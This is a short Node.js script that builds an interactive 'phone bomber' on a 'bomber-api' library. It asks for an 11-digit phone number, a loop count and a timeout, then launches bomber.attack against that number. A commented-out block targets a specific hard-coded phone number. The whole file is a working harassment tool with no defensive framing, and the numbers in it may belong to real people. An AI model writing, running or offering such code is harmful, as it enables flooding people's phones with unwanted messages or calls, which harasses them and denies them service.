const bomber = require("bomber-api");
// const stdin = process.openStdin();

// // 77777730601

// stdin.addListener("data", d => {
//     bomber.attack(79026574005, 1)
//     console.log("you entered: [" + d.toString().trim() + "]");
//     setTimeout(() => {
//         bomber.stop()
//     }, 2000)
// });

class Bomber {
    constructor() {
        this.data = {
            number: '',
            loop: 5,
            timeout: 5
        }
    }

    setBomber() {
        bomber.attack(this.data.number, this.data.loop);

        setTimeout(() => {
            bomber.stop()
            console.log('Bomber stop');
            process.exit()
        }, this.data.timeout * 1000)
    }

    Input(value) {
        const stdin = process.openStdin()
        process.stdout.write(value);
        return new Promise((res, rej) => stdin.addListener('data', text => res(text.toString().trim())))
    }

    setNumber() {
        this.Input('Number (7922358343234): ').then(value => {
            if (value.length !== 11) return this.setNumber()
            this.data.number = JSON.parse(value)
            this.setLoop()
        })
    }

    setLoop() {
        this.Input('Loop [max: 100]: ').then(value => {
            if (value > 100 || value < 1) return this.setLoop();
            this.data.loop = JSON.parse(value)
            this.setTimeout()
        })
    }

    setTimeout() {
        this.Input('Timeout [max: 100] (sec): ').then(value => {
            if (value > 100 || value < 1) return
            this.data.timeout = JSON.parse(value)
            console.log(this.data);
            this.setBomber()
        })
    }

    start() {
        this.setNumber()
    }
}

new Bomber().start()